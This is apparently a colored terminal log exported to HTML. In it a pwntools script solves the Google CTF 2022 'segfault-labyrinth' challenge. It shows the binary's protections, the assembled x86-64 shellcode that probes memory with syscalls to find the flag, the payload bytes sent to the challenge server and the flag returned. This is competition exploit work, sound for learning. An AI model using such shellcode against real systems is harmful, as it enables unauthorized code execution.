<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="application/xml+xhtml; charset=UTF-8" />
<title>stdin</title>
</head>
<body style="background:black">
<pre>
<span style="font-weight:bold;"></span><span style="font-weight:bold;color:dimgray;">[19996]</span><span style="font-weight:bold;color:blue;"> </span><span style="font-weight:bold;color:green;">j3r3mias</span><span style="font-weight:bold;color:dimgray;">@</span><span style="font-weight:bold;color:blue;">serenity</span><span style="font-weight:bold;color:dimgray;">:</span><span style="font-weight:bold;color:red;">misc-segfault-labyrinth</span><span style="font-weight:bold;color:purple;"> </span><span style="font-weight:bold;color:dimgray;">&gt;</span><span style="color:white;"></span><span style="color:white;background-color:black;"> python writeup-solver-01.py REMOTE DEBUG
[</span><span style="font-weight:bold;color:black;background-color:black;"></span><span style="font-weight:bold;color:blue;background-color:black;">*</span><span style="color:white;"></span><span style="color:white;background-color:black;">] '/CTF/2022-google-ctf/misc-segfault-labyrinth/challenge'
    Arch:     amd64-64-little
    RELRO:    </span><span style="color:olive;background-color:black;">Partial RELRO</span><span style="color:white;background-color:black;">
    Stack:    </span><span style="color:red;background-color:black;">No canary found</span><span style="color:white;background-color:black;">
    NX:       </span><span style="color:red;background-color:black;">NX disabled</span><span style="color:white;background-color:black;">
    PIE:      </span><span style="color:green;background-color:black;">PIE enabled</span><span style="color:white;background-color:black;">
    RWX:      </span><span style="color:red;background-color:black;">Has RWX segments</span><span style="color:white;background-color:black;">
[</span><span style="font-weight:bold;color:black;background-color:black;"></span><span style="font-weight:bold;color:red;background-color:black;">DEBUG</span><span style="color:white;"></span><span style="color:white;background-color:black;">] cpp -C -nostdinc -undef -P -I/home/j3r3mias/.local/lib/python3.10/site-packages/pwnlib/data/includes /dev/stdin
[</span><span style="font-weight:bold;color:black;background-color:black;"></span><span style="font-weight:bold;color:red;background-color:black;">DEBUG</span><span style="color:white;"></span><span style="color:white;background-color:black;">] Assembling
    .section .shellcode,&quot;awx&quot;
    .global _start
    .global __start
    .p2align 2
    _start:
    __start:
    .intel_syntax noprefix
    // for (ebx = 10; ebx &gt; 0; ebx--)
    nop
    mov ebx, 10
    corridors_loop:
        cmp ebx, 0
        je end_corridor_exit_labyrinth
        dec ebx
        // Use r15 as the reference to explore
        mov r15, rdi
        // while (1)
        doors_loop:
            // Use a position after our payload
            mov rdi, [r15]
            lea rsi, [rip + 0x300]
            mov rax, 4
            syscall
        // compare return with EFAULT (-14)
            cmp rax, -14
            jne doors_end_loop
            add r15, 8
            jmp doors_loop
        doors_end_loop:
        mov r15, [r15]
        jmp corridors_loop
    end_corridor_exit_labyrinth:
    mov rsi, rdi
    mov rdi, 1
    mov rdx, 0x100
    mov rax, 1
    syscall
    mov rax, 0x3c
    xor rdi, rdi
    syscall
    nop
    nop
    nop
    nop
[</span><span style="font-weight:bold;color:black;background-color:black;"></span><span style="font-weight:bold;color:red;background-color:black;">DEBUG</span><span style="color:white;"></span><span style="color:white;background-color:black;">] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-tjt5j4r1/step2 /tmp/pwn-asm-tjt5j4r1/step1
[</span><span style="font-weight:bold;color:black;background-color:black;"></span><span style="font-weight:bold;color:red;background-color:black;">DEBUG</span><span style="color:white;"></span><span style="color:white;background-color:black;">] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-tjt5j4r1/step3 /tmp/pwn-asm-tjt5j4r1/step4
[</span><span style="font-weight:bold;color:black;background-color:black;"></span><span style="font-weight:bold;color:green;background-color:black;">+</span><span style="color:white;"></span><span style="color:white;background-color:black;">] Opening connection to segfault-labyrinth.2022.ctfcompetition.com on port 1337: Done
[</span><span style="font-weight:bold;color:black;background-color:black;"></span><span style="font-weight:bold;color:red;background-color:black;">DEBUG</span><span style="color:white;"></span><span style="color:white;background-color:black;">] Received 0x1e bytes:
    b'== proof-of-work: disabled ==\n'
[</span><span style="font-weight:bold;color:black;background-color:black;"></span><span style="font-weight:bold;color:red;background-color:black;">DEBUG</span><span style="color:white;"></span><span style="color:white;background-color:black;">] Received 0x22 bytes:
    b'Welcome to the Segfault Labyrinth\n'
[</span><span style="font-weight:bold;color:black;background-color:black;"></span><span style="font-weight:bold;color:blue;background-color:black;">*</span><span style="color:white;"></span><span style="color:white;background-color:black;">] Payload length: 94
[</span><span style="font-weight:bold;color:black;background-color:black;"></span><span style="font-weight:bold;color:red;background-color:black;">DEBUG</span><span style="color:white;"></span><span style="color:white;background-color:black;">] Sent 0x9 bytes:
    00000000  5e </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;">  </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;">  </span><span style="color:red;background-color:black;">0a</span><span style="color:white;background-color:black;">                        │^</span><span style="color:red;background-color:black;">···</span><span style="color:blue;background-color:black;">│</span><span style="color:red;background-color:black;">····</span><span style="color:blue;background-color:black;">│</span><span style="color:red;background-color:black;">·</span><span style="color:white;background-color:black;">│
    00000009
[</span><span style="font-weight:bold;color:black;background-color:black;"></span><span style="font-weight:bold;color:red;background-color:black;">DEBUG</span><span style="color:white;"></span><span style="color:white;background-color:black;">] Sent 0x5f bytes:
    00000000  </span><span style="color:blue;background-color:black;">90</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">bb</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">0a</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;">  </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">83</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">fb</span><span style="color:white;background-color:black;">  </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> 74 29 </span><span style="color:green;background-color:black;">ff</span><span style="color:white;background-color:black;">  </span><span style="color:blue;background-color:black;">cb</span><span style="color:white;background-color:black;"> 49 </span><span style="color:blue;background-color:black;">89</span><span style="color:white;background-color:black;"> </span><span style="color:green;background-color:black;">ff</span><span style="color:white;background-color:black;">  │</span><span style="color:blue;background-color:black;">··</span><span style="color:red;background-color:black;">··</span><span style="color:blue;background-color:black;">│</span><span style="color:red;background-color:black;">··</span><span style="color:blue;background-color:black;">··│</span><span style="color:red;background-color:black;">·</span><span style="color:white;background-color:black;">t)</span><span style="color:green;background-color:black;">·</span><span style="color:blue;background-color:black;">│·</span><span style="color:white;background-color:black;">I</span><span style="color:blue;background-color:black;">·</span><span style="color:green;background-color:black;">·</span><span style="color:white;background-color:black;">│
    00000010  49 </span><span style="color:blue;background-color:black;">8b</span><span style="color:white;background-color:black;"> 3f 48  </span><span style="color:blue;background-color:black;">8d</span><span style="color:white;background-color:black;"> 35 </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">03</span><span style="color:white;background-color:black;">  </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> 48 </span><span style="color:blue;background-color:black;">c7</span><span style="color:white;background-color:black;">  </span><span style="color:blue;background-color:black;">c0</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">04</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;">  │I</span><span style="color:blue;background-color:black;">·</span><span style="color:white;background-color:black;">?H</span><span style="color:blue;background-color:black;">│·</span><span style="color:white;background-color:black;">5</span><span style="color:red;background-color:black;">·</span><span style="color:blue;background-color:black;">·│</span><span style="color:red;background-color:black;">··</span><span style="color:white;background-color:black;">H</span><span style="color:blue;background-color:black;">·│··</span><span style="color:red;background-color:black;">··</span><span style="color:white;background-color:black;">│
    00000020  </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">0f</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">05</span><span style="color:white;background-color:black;"> 48  </span><span style="color:blue;background-color:black;">83</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">f8</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">f2</span><span style="color:white;background-color:black;"> 75  </span><span style="color:blue;background-color:black;">06</span><span style="color:white;background-color:black;"> 49 </span><span style="color:blue;background-color:black;">83</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">c7</span><span style="color:white;background-color:black;">  </span><span style="color:blue;background-color:black;">08</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">eb</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">e1</span><span style="color:white;background-color:black;"> 4d  │</span><span style="color:red;background-color:black;">·</span><span style="color:blue;background-color:black;">··</span><span style="color:white;background-color:black;">H</span><span style="color:blue;background-color:black;">│···</span><span style="color:white;background-color:black;">u</span><span style="color:blue;background-color:black;">│·</span><span style="color:white;background-color:black;">I</span><span style="color:blue;background-color:black;">··│···</span><span style="color:white;background-color:black;">M│
    00000030  </span><span style="color:blue;background-color:black;">8b</span><span style="color:white;background-color:black;"> 3f </span><span style="color:blue;background-color:black;">eb</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">d2</span><span style="color:white;background-color:black;">  48 </span><span style="color:blue;background-color:black;">89</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">fe</span><span style="color:white;background-color:black;"> 48  </span><span style="color:blue;background-color:black;">c7</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">c7</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">01</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;">  </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> 48 </span><span style="color:blue;background-color:black;">c7</span><span style="color:white;background-color:black;">  │</span><span style="color:blue;background-color:black;">·</span><span style="color:white;background-color:black;">?</span><span style="color:blue;background-color:black;">··│</span><span style="color:white;background-color:black;">H</span><span style="color:blue;background-color:black;">··</span><span style="color:white;background-color:black;">H</span><span style="color:blue;background-color:black;">│···</span><span style="color:red;background-color:black;">·</span><span style="color:blue;background-color:black;">│</span><span style="color:red;background-color:black;">··</span><span style="color:white;background-color:black;">H</span><span style="color:blue;background-color:black;">·</span><span style="color:white;background-color:black;">│
    00000040  </span><span style="color:blue;background-color:black;">c2</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">01</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;">  </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> 48 </span><span style="color:blue;background-color:black;">c7</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">c0</span><span style="color:white;background-color:black;">  </span><span style="color:blue;background-color:black;">01</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;">  </span><span style="color:blue;background-color:black;">0f</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">05</span><span style="color:white;background-color:black;"> 48 </span><span style="color:blue;background-color:black;">c7</span><span style="color:white;background-color:black;">  │</span><span style="color:blue;background-color:black;">·</span><span style="color:red;background-color:black;">·</span><span style="color:blue;background-color:black;">·</span><span style="color:red;background-color:black;">·</span><span style="color:blue;background-color:black;">│</span><span style="color:red;background-color:black;">·</span><span style="color:white;background-color:black;">H</span><span style="color:blue;background-color:black;">··│·</span><span style="color:red;background-color:black;">···</span><span style="color:blue;background-color:black;">│··</span><span style="color:white;background-color:black;">H</span><span style="color:blue;background-color:black;">·</span><span style="color:white;background-color:black;">│
    00000050  </span><span style="color:blue;background-color:black;">c0</span><span style="color:white;background-color:black;"> 3c </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;">  </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> 48 31 </span><span style="color:green;background-color:black;">ff</span><span style="color:white;background-color:black;">  </span><span style="color:blue;background-color:black;">0f</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">05</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">90</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">90</span><span style="color:white;background-color:black;">  </span><span style="color:blue;background-color:black;">90</span><span style="color:white;background-color:black;"> </span><span style="color:blue;background-color:black;">90</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">0a</span><span style="color:white;background-color:black;">     │</span><span style="color:blue;background-color:black;">·</span><span style="color:white;background-color:black;">&lt;</span><span style="color:red;background-color:black;">··</span><span style="color:blue;background-color:black;">│</span><span style="color:red;background-color:black;">·</span><span style="color:white;background-color:black;">H1</span><span style="color:green;background-color:black;">·</span><span style="color:blue;background-color:black;">│····│··</span><span style="color:red;background-color:black;">·</span><span style="color:white;background-color:black;">│
    0000005f
[</span><span style="font-weight:bold;color:black;background-color:black;"></span><span style="font-weight:bold;color:green;background-color:black;">+</span><span style="color:white;"></span><span style="color:white;background-color:black;">] Receiving all data: Done (257B)
[</span><span style="font-weight:bold;color:black;background-color:black;"></span><span style="font-weight:bold;color:red;background-color:black;">DEBUG</span><span style="color:white;"></span><span style="color:white;background-color:black;">] Received 0x100 bytes:
    00000000  43 54 46 7b  63 30 6e 67  72 61 74 75  6c 61 74 31  │CTF{</span><span style="color:blue;background-color:black;">│</span><span style="color:white;background-color:black;">c0ng</span><span style="color:blue;background-color:black;">│</span><span style="color:white;background-color:black;">ratu</span><span style="color:blue;background-color:black;">│</span><span style="color:white;background-color:black;">lat1│
    00000010  6f 6e 73 5f  6f 4e 5f 6d  34 6b 31 6e  47 5f 31 74  │ons_</span><span style="color:blue;background-color:black;">│</span><span style="color:white;background-color:black;">oN_m</span><span style="color:blue;background-color:black;">│</span><span style="color:white;background-color:black;">4k1n</span><span style="color:blue;background-color:black;">│</span><span style="color:white;background-color:black;">G_1t│
    00000020  5f 74 68 72  30 75 47 68  5f 74 68 33  5f 6c 34 42  │_thr</span><span style="color:blue;background-color:black;">│</span><span style="color:white;background-color:black;">0uGh</span><span style="color:blue;background-color:black;">│</span><span style="color:white;background-color:black;">_th3</span><span style="color:blue;background-color:black;">│</span><span style="color:white;background-color:black;">_l4B│
    00000030  79 72 31 6e  74 68 7d </span><span style="color:red;background-color:black;">0a</span><span style="color:white;background-color:black;">  </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;">  </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;">  │yr1n</span><span style="color:blue;background-color:black;">│</span><span style="color:white;background-color:black;">th}</span><span style="color:red;background-color:black;">·</span><span style="color:blue;background-color:black;">│</span><span style="color:red;background-color:black;">····</span><span style="color:blue;background-color:black;">│</span><span style="color:red;background-color:black;">····</span><span style="color:white;background-color:black;">│
    00000040  </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;">  </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;">  </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;">  </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;"> </span><span style="color:red;background-color:black;">00</span><span style="color:white;background-color:black;">  │</span><span style="color:red;background-color:black;">····</span><span style="color:blue;background-color:black;">│</span><span style="color:red;background-color:black;">····</span><span style="color:blue;background-color:black;">│</span><span style="color:red;background-color:black;">····</span><span style="color:blue;background-color:black;">│</span><span style="color:red;background-color:black;">····</span><span style="color:white;background-color:black;">│
    *
    00000100
[</span><span style="font-weight:bold;color:black;background-color:black;"></span><span style="font-weight:bold;color:blue;background-color:black;">*</span><span style="color:white;"></span><span style="color:white;background-color:black;">] Closed connection to segfault-labyrinth.2022.ctfcompetition.com port 1337
[</span><span style="font-weight:bold;color:black;background-color:black;"></span><span style="font-weight:bold;color:blue;background-color:black;">*</span><span style="color:white;"></span><span style="color:white;background-color:black;">] Output: b'\nCTF{c0ngratulat1ons_oN_m4k1nG_1t_thr0uGh_th3_l4Byr1nth}\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
</span><span style="font-weight:bold;color:black;background-color:black;"></span><span style="font-weight:bold;color:dimgray;background-color:black;">[19997]</span><span style="font-weight:bold;color:blue;background-color:black;"> </span><span style="font-weight:bold;color:green;background-color:black;">j3r3mias</span><span style="font-weight:bold;color:dimgray;background-color:black;">@</span><span style="font-weight:bold;color:blue;background-color:black;">serenity</span><span style="font-weight:bold;color:dimgray;background-color:black;">:</span><span style="font-weight:bold;color:red;background-color:black;">misc-segfault-labyrinth</span><span style="font-weight:bold;color:purple;background-color:black;"> </span><span style="font-weight:bold;color:dimgray;background-color:black;">&gt;</span><span style="color:white;"></span><span style="color:white;background-color:black;">
</span>
</pre>
</body>
</html>
